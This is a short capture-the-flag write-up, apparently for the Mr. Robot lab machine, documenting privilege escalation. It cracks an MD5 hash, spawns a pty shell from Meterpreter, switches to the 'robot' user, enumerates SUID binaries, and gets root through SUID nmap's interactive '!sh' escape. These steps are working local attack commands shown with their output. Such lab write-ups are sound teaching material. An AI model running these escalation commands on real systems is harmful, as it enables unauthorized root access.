# 03 - Privilege Escalation

## Hash Cracking

Used CrackStation to look up the MD5 hash from `password.raw-md5`.

```
c3fcd3d76192e4007dfb496cca67e13b → abcdefghijklmnopqrstuvwxyz
```

---

## Switch to Robot User

Spawned a bash shell from Meterpreter and switched users.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su robot
```

Entered the cracked password and verified.

```bash
whoami
```

Output:

```
robot
```

---

## SUID Enumeration

Searched for binaries with the SUID bit set.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Notable finding:

```
/usr/local/bin/nmap
```

The Nmap binary was owned by **root** with the SUID bit set.

---

## Root Shell

Nmap has an interactive mode that can execute shell commands as the file owner.

```bash
nmap --interactive
```

From the Nmap interactive prompt:

```
nmap> !sh
```

Verified root access:

```bash
whoami
```

Output:

```
root
```

---

## Key 3

Located the final key in the root home directory.

```bash
cat /root/key-3-of-3.txt
```
